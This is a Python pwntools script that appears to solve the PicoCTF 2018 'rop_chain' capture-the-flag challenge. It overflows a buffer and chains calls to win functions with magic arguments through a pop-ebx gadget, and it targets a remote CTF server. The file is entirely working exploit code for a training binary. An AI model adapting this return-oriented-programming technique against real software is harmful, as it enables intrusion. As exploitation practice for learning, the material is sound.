from pwn import *


def PicoCTF_2018_rop_chain(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/PicoCTF_2018_rop_chain'):
    print('PicoCTF_2018_rop_chain start')
    context(log_level='debug', arch='i386', os='linux')
    target = process([file_name])
    target = remote('node4.buuoj.cn', 29684)
    target_elf = ELF(file_name)

    pop_ret_gadget = p32(0x0804840d)  # pop ebx ; ret
    win_func1_addr = p32(target_elf.symbols['win_function1'])
    win_func2_addr = p32(target_elf.symbols['win_function2'])
    flag_addr = p32(target_elf.symbols['flag'])

    payload = b'a' * 28
    # win_function1()
    payload += win_func1_addr
    # win_function2(-1163220307)
    payload += win_func2_addr + pop_ret_gadget + int.to_bytes(-1163220307, 4, byteorder='little', signed=True)
    # flag(-559039827)
    payload += flag_addr + pop_ret_gadget + int.to_bytes(-559039827, length=4, byteorder='little', signed=True)

    target.sendlineafter('Enter your input> ', payload)
    print(target.recv())
    print('PicoCTF_2018_rop_chain end')


if __name__ == '__main__':
    PicoCTF_2018_rop_chain()
